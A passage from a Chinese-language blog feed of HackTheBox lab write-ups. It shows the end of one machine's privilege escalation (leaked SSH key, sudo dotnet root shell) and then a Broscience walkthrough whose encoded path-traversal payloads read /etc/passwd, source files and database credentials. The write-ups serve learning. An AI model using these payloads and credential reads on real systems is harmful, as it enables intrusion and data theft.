J65KQ249fwbsOMJKZ8xppWE3jPxBWmHHUok8VXx2jL0B6n\nxQWmaLh5egc0gyZQhOmhO/5g/WwzTpLcfD093V6eMevWDCirXrsQqyIenEA1WN1Dcn+V7r\nDyLjljQtfPG6wXinfmb18qP3e9NT9MR8SKgl/sRiEf8f19CAAAAMEA/8ZJy69MY0fvLDHT\nWhI0LFnIVoBab3r3Ys5o4RzacsHPvVeUuwJwqCT/IpIp7pVxWwS5mXiFFVtiwjeHqpsNZK\nEU1QTQZ5ydok7yi57xYLxsprUcrH1a4/x4KjD1Y9ijCM24DknenyjrB0l2DsKbBBUT42Rb\nzHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB/Bsx94LCZQcsIBkIHXB8fraNm\niOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG/zECXFPQVIPj1uKrwRb6V9g\nGDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4z05AMJzixi0xO25XO/Zp2\niH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL/yqT+DmBsuADQYU19aO9LWUIhJj\neHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&quot;</span> &gt; /tmp/phil.id_rsa</span><br><span class="line">chmod 400 /tmp/phil.id_rsa</span><br><span class="line">ssh -i /tmp/phil.id_rsa phil@10.10.11.201</span><br></pre></td></tr></table></figure><p>登入SSH服务，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3c34107a7c750f4897e23fe74a9ee2e</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>切至developer用户，并查看sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su developer</span><br><span class="line">k8wdAYYKyhnjg3K</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for developer on bagel:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep&#x3D;&quot;COLORS DISPLAY</span><br><span class="line">    HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+&#x3D;&quot;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+&#x3D;&quot;LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE&quot;, env_keep+&#x3D;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;var&#x2F;lib&#x2F;snapd&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User developer may run the following commands on bagel:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;dotnet</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/dotnet fsi</span><br><span class="line">System.Diagnostics.Process.Start(<span class="string">&quot;/bin/bash&quot;</span>).WaitForExit();;</span><br></pre></td></tr></table></figure><p>获得root权限，查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d5a0583d89d813c3e82758bd9aba410d</span><br></pre></td></tr></table></figure><hr /><p>.NET json反序列化还是有点超出我的知识范围了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Broscience</title>
    <link href="https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/"/>
    <id>https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/</id>
    <published>2023-03-23T17:54:02.000Z</published>
    <updated>2023-03-23T18:07:19.041Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_broscience"><a class="markdownIt-Anchor" href="#hackthebox_broscience"></a> HackTheBox_Broscience</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.195</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.195</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORTSTATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh  OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp  open  http Apache httpd 2.4.54</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.54 ((Debian))</span><br><span class="line">Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>查看域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.195</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Thu, 23 Mar 2023 11:11:56 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">Location: https:&#x2F;&#x2F;broscience.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.195\tbroscience.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;images&#x2F;   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;includes&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;manual&#x2F;</span><br></pre></td></tr></table></figure><p>枚举PHP文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/ -X .php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;activate.php (CODE:200|SIZE:1256)  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;comment.php (CODE:302|SIZE:13) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;index.php (CODE:200|SIZE:9304) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;login.php (CODE:200|SIZE:1936) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;logout.php (CODE:302|SIZE:0)   </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;register.php (CODE:200|SIZE:2161)  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;user.php (CODE:200|SIZE:1309)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问主页，存在链接<code>https://broscience.htb/includes/img.php?path=bench.png</code></p><p>构造LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:106:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:107:115:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:108:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:110:116:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:112:118:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:113:121::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:114:122:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:115:123::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:116:124:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">bill:x:1000:1000:bill,,,:&#x2F;home&#x2F;bill:&#x2F;bin&#x2F;bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:117:125:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/img.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/img.php&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Missing \&#x27;path\&#x27; parameter.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for LFI attacks</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$badwords</span> = <span class="keyword">array</span>(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;etc/passwd&quot;</span>, <span class="string">&quot;.ssh&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$badwords</span> <span class="keyword">as</span> <span class="variable">$badword</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$path</span>, <span class="variable">$badword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Normalize path</span></span><br><span class="line"><span class="variable">$path</span> = urldecode(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the image</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/images/&#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/</code>路径下文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db_connect.php</span><br><span class="line">header.php</span><br><span class="line">img.php</span><br><span class="line">navbar.php</span><br><span class="line">utils.php</span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/db_connect.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/db_connect.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_port</span> = <span class="string">&quot;5432&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;broscience&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;dbuser&quot;</span>;</span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&quot;RangeOfMotion%777&quot;</span>;</span><br><span class="line"><span class="variable">$db_salt</span> = <span class="string">&quot;NaCl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_conn</span> = pg_connect(<span class="string">&quot;host=<span class="subst">&#123;$db_host&#125;</span> port=<span class="subst">&#123;$db_port&#125;</span> dbname=<span class="subst">&#123;$db_name&#125;</span> user=<span class="subst">&#123;$db_user&#125;</span> password=<span class="subst">&#123;$db_pass&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$db_conn</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到postgresql数据库登陆凭证</p><p>查看<code>broscience.htb/register.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fregister.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$activation_code</span> = generate_activation_code();</span><br><span class="line"><span class="variable">$activation_link</span> = <span class="string">&quot;https://broscience.htb/activate.php?code=<span class="subst">&#123;$activation_code&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = pg_execute(<span class="variable">$db_conn</span>, <span class="string">&quot;create_user_query&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], md5(<span class="variable">$db_salt</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$activation_code</span>));</span><br></pre></td></tr></table></figure><p>得到账户激活码生成函数名，激活码参数，以及用户创建语句</p><p>查看<code>broscience.htb/includes/utils.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/utils.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">    srand(time());</span><br><span class="line">    <span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rel_time</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$to</span> = ((<span class="variable">$to</span> === <span class="literal">null</span>) ? (time()) : (<span class="variable">$to</span>));</span><br><span class="line">    <span class="variable">$to</span> = ((is_int(<span class="variable">$to</span>)) ? (<span class="variable">$to</span>) : (strtotime(<span class="variable">$to</span>)));</span><br><span class="line">    <span class="variable">$from</span> = ((is_int(<span class="variable">$from</span>)) ? (<span class="variable">$from</span>) : (strtotime(<span class="variable">$from</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$units</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;year&quot;</span>   =&gt; <span class="number">29030400</span>, <span class="comment">// seconds in a year   (12 months)</span></span><br><span class="line">        <span class="string">&quot;month&quot;</span>  =&gt; <span class="number">2419200</span>,  <span class="comment">// seconds in a month  (4 weeks)</span></span><br><span class="line">        <span class="string">&quot;week&quot;</span>   =&gt; <span class="number">604800</span>,   <span class="comment">// seconds in a week   (7 days)</span></span><br><span class="line">        <span class="string">&quot;day&quot;</span>    =&gt; <span class="number">86400</span>,    <span class="comment">// seconds in a day    (24 hours)</span></span><br><span class="line">        <span class="string">&quot;hour&quot;</span>   =&gt; <span class="number">3600</span>,     <span class="comment">// seconds in an hour  (60 minutes)</span></span><br><span class="line">        <span class="string">&quot;minute&quot;</span> =&gt; <span class="number">60</span>,       <span class="comment">// seconds in a minute (60 seconds)</span></span><br><span class="line">        <span class="string">&quot;second&quot;</span> =&gt; <span class="number">1</span>         <span class="comment">// 1 second</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$diff</span> = abs(<span class="variable">$from</span> - <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$diff</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just now&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$suffix</span> = ((<span 